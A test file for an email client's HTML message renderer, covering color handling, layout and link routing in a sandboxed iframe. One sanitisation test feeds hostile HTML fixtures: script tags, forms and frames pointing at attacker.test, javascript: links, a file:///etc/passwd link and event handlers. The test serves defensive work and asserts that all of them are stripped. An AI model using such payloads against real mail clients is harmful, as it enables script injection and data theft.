import { act, cleanup, fireEvent, render } from '@testing-library/react'
import { createElement } from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import HtmlMessage, { safeMailDocument } from '../src/renderer/src/components/mail/HtmlMessage'
import { useBrowser } from '../src/renderer/src/state/browser'
import { useMail } from '../src/renderer/src/state/mail'

class Observer {
  observe(): void {}
  disconnect(): void {}
}

beforeEach(() => {
  Object.assign(globalThis, { ResizeObserver: Observer, IS_REACT_ACT_ENVIRONMENT: true })
  useBrowser.setState({ open: false, tabs: [], activeTabId: null })
  useMail.setState({
    accounts: [{ id: 'account-one', email: 'me@example.com', displayName: 'Me', status: 'connected', unread: 0, labels: [] }],
    drafts: []
  })
})

afterEach(() => {
  cleanup()
  vi.useRealTimers()
  vi.restoreAllMocks()
})

async function draw(html: string): Promise<HTMLIFrameElement> {
  const view = render(createElement(HtmlMessage, { html, text: '' }))
  const frame = view.container.querySelector('iframe') as HTMLIFrameElement
  await act(async () => fireEvent.load(frame))
  return frame
}

describe('mail message isolation', () => {
  it('matches a declared light email canvas without changing sender colors', () => {
    const html = '<body bgcolor="#FFFFFF" style="padding: 12px" onload="alert(1)"><p style="color: rebeccapurple">Words</p></body>'
    const light = safeMailDocument(html, 'light')
    const dark = safeMailDocument(html, 'dark')
    const parsed = new DOMParser().parseFromString(light, 'text/html')

    expect(light).toMatch(/:root \{ background: (?:#FFFFFF|rgb\(255, 255, 255\)); \}/)
    expect(light).not.toContain('color-scheme')
    expect(light).toContain('color: rgba(20,20,20,.82)')
    expect(dark).toMatch(/:root \{ background: (?:#FFFFFF|rgb\(255, 255, 255\)); \}/)
    expect(dark).not.toContain('color-scheme')
    expect(dark).toContain('color: rgba(20,20,20,.82)')
    expect(light).toContain('style="color: rebeccapurple"')
    expect(dark).toContain('style="color: rebeccapurple"')
    expect(parsed.body.getAttribute('bgcolor')).toBe('#FFFFFF')
    expect(parsed.body.getAttribute('style')).toBe('padding: 12px')
    expect(parsed.body.hasAttribute('onload')).toBe(false)
  })

  it('leaves the document canvas clear when the sender did not give it a background', () => {
    const dark = safeMailDocument('<p>Words</p>', 'dark')
    const light = safeMailDocument('<p>Words</p>', 'light')

    expect(dark).toContain(':root { background: transparent; }')
    expect(dark).toContain('color: rgba(255,255,255,.82)')
    expect(light).toContain('color: rgba(20,20,20,.82)')
  })

  it('keeps inherited LinkedIn copy dark on its light canvas', () => {
    const source = safeMailDocument(`
      <body style="background-color: #f3f2f0">
        <table style="background-color: #ffffff">
          <tr><td id="headline" style="font-size: 14px">Director, Global Partnerships @ GBG Plc</td></tr>
        </table>
      </body>
    `, 'dark')
    const frame = window.document.createElement('iframe')
    window.document.body.append(frame)
    const document = frame.contentDocument!
    document.open()
    document.write(source)
    document.close()

    expect(source).toContain(':root { background: rgb(243, 242, 240); }')
    expect(document.defaultView?.getComputedStyle(document.querySelector('#headline')!).color).toBe('rgba(20, 20, 20, 0.82)')
  })

  it('keeps inherited copy light on a dark sender canvas', () => {
    const document = safeMailDocument('<body style="background-color: #111827"><p>Words</p></body>', 'light')

    expect(document).toContain('color: rgba(255,255,255,.82)')
  })

  it('clips a sender background to the message curve', async () => {
    const frame = await draw('<body bgcolor="#FFFFFF">Words</body>')

    expect(frame.parentElement?.className).toContain('overflow-hidden')
    expect(frame.parentElement?.className).toContain('rounded-xl')
  })

  it('keeps rounded email tables and fixed-size artwork intact', () => {
    const html = `
      <table id="sheet" style="border:1px solid #004449;border-radius:7px" width="600">
        <tr>
          <td id="icon-cell" width="45" style="width:45px;padding-right:16px">
            <img id="icon" width="45" height="45" style="display:block;width:45px;height:45px">
          </td>
          <td id="chip" style="border:1px solid #d7ffc2;border-radius:32px">94k points</td>
        </tr>
      </table>
    `
    const document = safeMailDocument(html, 'light')
    const parsed = new DOMParser().parseFromString(document, 'text/html')
    const styles = parsed.head.querySelector('style')?.textContent ?? ''

    expect(styles).not.toContain('max-width: 100%;')
    expect(styles).not.toContain('border-collapse: collapse;')
    expect(styles).not.toContain('height: auto;')
    expect(styles).toContain('img { max-width: 100vw; }')
    expect(parsed.querySelector('#sheet')?.getAttribute('style')).toContain('border-radius:7px')
    expect(parsed.querySelector('#icon')?.getAttribute('style')).toContain('width:45px;height:45px')
    expect(parsed.querySelector('#chip')?.getAttribute('style')).toContain('border-radius:32px')
  })

  it('measures parsed mail before remote resources finish loading', async () => {
    vi.useFakeTimers()
    const view = render(createElement(HtmlMessage, { html: '<p>Long message</p>', text: '' }))
    const frame = view.container.querySelector('iframe') as HTMLIFrameElement
    const document = frame.contentDocument!
    Object.defineProperty(document, 'URL', { configurable: true, value: 'about:srcdoc' })
    Object.defineProperty(document.documentElement, 'scrollHeight', { configurable: true, value: 640 })
    Object.defineProperty(document.body, 'scrollHeight', { configurable: true, value: 620 })

    await act(async () => {
      vi.advanceTimersByTime(16)
    })

    expect(frame.style.height).toBe('640px')
  })

  it('removes executable elements, event handlers, embedded pages, and unsafe links', async () => {
    const frame = await draw(`
      <script>window.stolen = true</script>
      <iframe src="https://attacker.test"></iframe>
      <object data="https://attacker.test/file"></object>
      <form action="https://attacker.test"><input name="secret"><button>Send</button></form>
      <a id="script" href="javascript:alert(1)" onclick="alert(2)">Bad</a>
      <a id="file" href="file:///etc/passwd">File</a>
      <p id="copy" onmouseover="alert(3)" srcdoc="bad">Safe words</p>
    `)
    const source = frame.getAttribute('srcdoc') ?? ''
    const parsed = new DOMParser().parseFromString(source, 'text/html')

    expect(parsed.querySelector('script, iframe, object, form, input, button')).toBeNull()
    expect(parsed.querySelector('#script')?.hasAttribute('href')).toBe(false)
    expect(parsed.querySelector('#file')?.hasAttribute('href')).toBe(false)
    expect(parsed.querySelector('#copy')?.hasAttribute('onmouseover')).toBe(false)
    expect(parsed.querySelector('#copy')?.hasAttribute('srcdoc')).toBe(false)
    expect(parsed.body.textContent).toContain('Safe words')
    expect(source).toContain(`default-src 'none'`)
    expect(source).toContain(`connect-src 'none'`)
    expect(source).toContain(`frame-src 'none'`)
  })

  it('shows remote images without a separate action', async () => {
    const frame = await draw(`
      <img src="https://track.example/pixel.gif" srcset="https://track.example/large.gif 2x">
      <img src="http://images.example/photo.jpg">
      <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==">
    `)
    const source = frame.getAttribute('srcdoc') ?? ''
    const parsed = new DOMParser().parseFromString(source, 'text/html')
    const images = [...parsed.querySelectorAll('img')]

    expect(images[0].getAttribute('src')).toBe('https://track.example/pixel.gif')
    expect(images[0].getAttribute('srcset')).toBe('https://track.example/large.gif 2x')
    expect(images[1].getAttribute('src')).toBe('http://images.example/photo.jpg')
    expect(images[2].getAttribute('src')).toMatch(/^data:/)
    expect(source).toMatch(/img-src [^;]*http: https:/)
    expect(document.querySelector('button')).toBeNull()
  })

  it('opens web links in Browser and mail links in a Crew composer', async () => {
    const openExternal = vi.fn(async (_url: string) => true)
    Object.assign(window, { crew: { openExternal } })
    const frame = await draw('<a href="https://crew.test/read">Read</a><a href="mailto:ali@example.com">Write</a>')
    const document = frame.contentDocument!
    document.body.innerHTML = '<a id="web" href="https://crew.test/read">Read</a><a id="mail" href="mailto:ali@example.com">Write</a><a id="local" href="#inside">Inside</a>'
    await act(async () => fireEvent.load(frame))
    openExternal.mockClear()

    await act(async () => {
      document.querySelector('#web')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
      document.querySelector('#mail')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
      document.querySelector('#local')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))
    })

    expect(useBrowser.getState()).toMatchObject({
      open: true,
      tabs: [{ kind: 'web', url: 'https://crew.test/read' }]
    })
    expect(openExternal).not.toHaveBeenCalled()
    expect(useMail.getState().drafts).toEqual([
      expect.objectContaining({ accountId: 'account-one', to: [{ email: 'ali@example.com' }] })
    ])
  })

  it('fills a Crew draft from mail link fields using the message account', async () => {
    useMail.setState({
      accounts: [
        { id: 'account-one', email: 'one@example.com', displayName: 'One', status: 'connected', unread: 0, labels: [] },
        { id: 'account-two', email: 'two@example.com', displayName: 'Two', status: 'connected', unread: 0, labels: [] }
      ],
      drafts: []
    })
    const view = render(createElement(HtmlMessage, {
      html: '<a href="mailto:Ali%20Hammoud%20%3Cali%40example.com%3E?cc=crew%40example.com&bcc=quiet%40example.com&subject=Hello%20Crew&body=First%20line%0ASecond%20line">Write</a>',
      text: '',
      accountId: 'account-two'
    }))
    const frame = view.container.querySelector('iframe') as HTMLIFrameElement
    await act(async () => fireEvent.load(frame))
    const document = frame.contentDocument!
    document.body.innerHTML = '<a id="mail" href="mailto:Ali%20Hammoud%20%3Cali%40example.com%3E?cc=crew%40example.com&bcc=quiet%40example.com&subject=Hello%20Crew&body=First%20line%0ASecond%20line">Write</a>'
    await act(async () => fireEvent.load(frame))

    document.querySelector('#mail')?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }))

    expect(useMail.getState().drafts).toEqual([
      expect.objectContaining({
        accountId: 'account-two',
        to: [{ name: 'Ali Hammoud', email: 'ali@example.com' }],
        cc: [{ email: 'crew@example.com' }],
        bcc: [{ email: 'quiet@example.com' }],
        subject: 'Hello Crew',
        text: 'First line\nSecond line'
      })
    ])
  })
})
